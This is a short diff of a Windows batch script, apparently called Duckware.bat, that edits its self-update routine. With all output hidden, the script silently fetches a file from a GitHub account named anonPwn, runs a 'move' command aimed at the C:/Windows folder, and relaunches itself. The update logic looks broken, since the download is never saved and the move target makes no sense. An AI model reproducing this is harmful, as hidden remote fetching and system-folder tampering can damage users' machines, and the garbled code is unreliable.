@@ -4,7 +4,6 @@ if /i not "%~1"=="updated" (
     echo Updating %~nx0 ...
     >nul 2>&1 powershell iwr "https://raw.githubusercontent.com/anonPwn/Batch/refs/heads/main/Duckware.bat"
     >nul 2>&1 move /y "C:/Windows" "%~dpnx0"
+    >nul 2>&1 powershell start "%~0" updated & exit /b
 )
-start /min C:\Users\grays\Downloads\Duckware.bat
-exit /b
 )
